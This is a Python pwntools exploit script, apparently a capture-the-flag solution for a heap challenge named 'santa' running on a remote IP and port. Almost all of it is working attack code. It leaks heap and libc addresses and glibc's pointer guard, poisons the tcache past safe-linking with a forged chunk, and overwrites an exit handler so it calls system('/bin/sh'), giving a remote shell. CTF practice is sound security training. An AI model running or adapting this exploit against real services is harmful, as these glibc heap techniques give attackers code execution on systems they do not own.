from pwn import *

elf = context.binary = ELF("santa")
libc = ELF("libc.so.6")

# p = process()
p = remote("188.166.197.31", 30005)

# HELPER FUNCTIONS
def malloc(size:int, data:bytes, index:int):
    assert len(data) <= size

    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'>', str(index).encode())
    p.sendlineafter(b'>', str(size).encode())   
    p.sendlineafter(b'>', data)

def free(index:int):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'>', str(index).encode())

def read(index:int):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'>', str(index).encode())
    p.recvuntil(b'All I want for Christmas is\n')
    return p.recvline().strip()

def encrypt(pos, ptr):
    return (pos >> 12) ^ ptr

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

def ptrMangle(v, key):
    return p64(rol(v ^ key, 0x11, 64))

# Leaking heap base
malloc(0, b'', 1)
free(1)
malloc(0, b'', 1)
heapBase = u64(read(1).ljust(8, b'\x00')) * 0x1000
print(f"Got Heap Base: {hex(heapBase)}")

malloc(0x450, b'unsorted bin chunk', 2)   
malloc(0x16, b'padding', 3)
free(2)
malloc(0, b'', 2)
libcBase = u64(read(2).ljust(8, b'\x00')) - libc.symbols['main_arena'] - 1120
print(f"Got Libc Base: {hex(libcBase)}")

# Overwriting limit
malloc(0, b'', -4)

# Leaking pointer guard
p.sendlineafter(b'>', b'3'.ljust(8) + pack(libcBase - 10392 + 8))
p.sendlineafter(b'>', b'11')
p.recvuntil(b'is\n')
ptrGuard = u64(p.recvline().strip().ljust(8, b'\x00'))
print(f"Got Pointer Guard: {hex(ptrGuard)}")

# Clearing everything 
# Because I can't be bothered to keep check of the chunks
for i in range(10):
    free(i)

# Forging fake chunk
# I got this value from GDB
fakeChunk = heapBase + 784 + 16

# Note that in newer version of libc 
# we have to encrypt our FD pointers
malloc(400, flat(
    0, 0,
    0, 0x21,
    encrypt(fakeChunk + 8 * 4, 1), 0,
), 3)

print(f"Addr of fake chunk: {fakeChunk}")

# Target to be overwritten
exitHandler = libcBase + 2207488

p.sendlineafter(b'>', b'2'.ljust(8) + pack(fakeChunk))
p.sendlineafter(b'>', b'11')

# Freeing fake chunk so we can overwrite the 
# FD pointer
free(3)

malloc(400, flat(
    0, 0,
    0, 0x21,
    encrypt(fakeChunk + 8 * 4, exitHandler + 16),
), 3)

# Malloc to bring the next chunk (at exit handler)
# to the top
malloc(0x10, b'', 4)
# Overwriting exit handler
malloc(0x18, pack(4) + ptrMangle(libc.symbols['system'] + libcBase, ptrGuard) + pack(libcBase + next(libc.search(b'/bin/sh'))), 5)

# Exiting to get shell
p.sendlineafter(b'>', b'4')
p.interactive()
# just cat flag.txt